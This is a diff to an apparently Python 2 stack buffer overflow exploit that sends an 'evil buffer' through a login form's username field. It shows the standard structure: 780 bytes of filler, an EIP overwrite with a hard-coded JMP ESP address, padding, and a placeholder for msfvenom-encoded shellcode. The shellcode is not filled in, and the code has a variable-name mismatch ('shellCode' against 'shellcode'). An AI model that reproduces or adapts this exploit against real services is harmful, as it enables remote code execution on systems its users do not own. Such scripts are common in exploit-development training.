@@ -7,9 +7,13 @@ import socket
 try:
   print "\nSending evil buffer..."
   
-  size = 800
-  
-  inputBuffer = "A" * size
+  filler = "A" * 780
+  eip = "\x83\x0c\x09\x10" #address of JMP ESP here
+  offset = "C" * 4
+  shellcode = "msfVenom payload SGN encoded here"
+  buffer = shellCode * (1500 - len(filler) - len(eip) - 
+len(offset))
+  inputBuffer = filler + eip + offset + buffer
   
   content = "username=" + inputBuffer + "&password=A"
 
